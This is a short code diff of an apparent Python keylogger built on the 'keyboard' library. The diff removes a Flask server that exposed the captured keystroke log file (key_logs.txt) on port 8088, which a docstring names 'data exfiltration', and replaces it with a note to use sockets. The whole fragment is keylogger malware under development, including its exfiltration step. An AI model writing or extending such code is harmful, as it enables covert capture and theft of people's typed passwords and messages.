@@ -2,7 +2,6 @@
 import keyboard
 import time
 import threading
-from flask import Flask, send_file
 
 
 '''
@@ -39,14 +38,9 @@ class Keylogger:
         '''
         Perform data exfiltration
         Open a port on the system 
-        '''
-        file = './key_logs.txt'
-        app = Flask(__name__)
 
-        @app.route('/')
-        def serve_file():
-            return send_file(file)
-        app.run(port=8088)
+        !use sockets
+        '''
 
 
 Keylogger()
